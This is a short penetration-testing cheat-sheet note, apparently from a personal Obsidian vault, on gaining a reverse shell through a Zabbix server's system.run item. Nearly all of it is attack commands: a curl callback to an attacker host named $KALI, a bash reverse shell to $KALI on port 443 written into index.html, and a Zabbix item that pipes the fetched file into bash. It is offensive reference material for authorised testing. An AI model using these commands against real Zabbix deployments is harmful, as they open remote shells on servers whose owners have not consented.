---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
https://blog.zabbix.com/zabbix-remote-commands/7500/

[[TechLexicon/Penetration Testing/Reference/7._Tools/Python#Server]]

Configuration > Hosts > $Hostname > Configuration > Items > Create Item
```
system.run[curl $KALI,nowait]
```

Click `Test`, then `Get value`, check listener.

![[Pasted image 20220925113513.png]]

```bash - kali
echo '/bin/bash -c "bash -i >& /dev/tcp/$KALI/443 0>&1"' > index.html
```

```
system.run[curl $KALI|bash,nowait]
```


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
